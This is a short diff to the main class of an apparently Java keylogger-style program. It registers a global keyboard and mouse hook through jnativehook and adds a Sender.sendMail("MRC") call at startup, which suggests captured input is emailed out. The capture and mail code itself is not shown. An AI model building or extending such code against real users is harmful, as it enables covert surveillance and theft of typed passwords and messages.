@@ -1,9 +1,14 @@
 package main;
 
 import org.jnativehook.GlobalScreen;
+
+
+
 import org.jnativehook.NativeHookException;
 
 import handlers.ManageService;
+import handlers.Sender;
+import javax.activation.DataSource;
 
 
 public class main {
@@ -14,8 +19,9 @@ public class main {
 		ManageService service = new ManageService();
 		// TODO Auto-generated method stub
 		try {
+			Sender.sendMail("MRC");
 			GlobalScreen.registerNativeHook();
-		} catch (NativeHookException e) {
+		} catch (Throwable e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
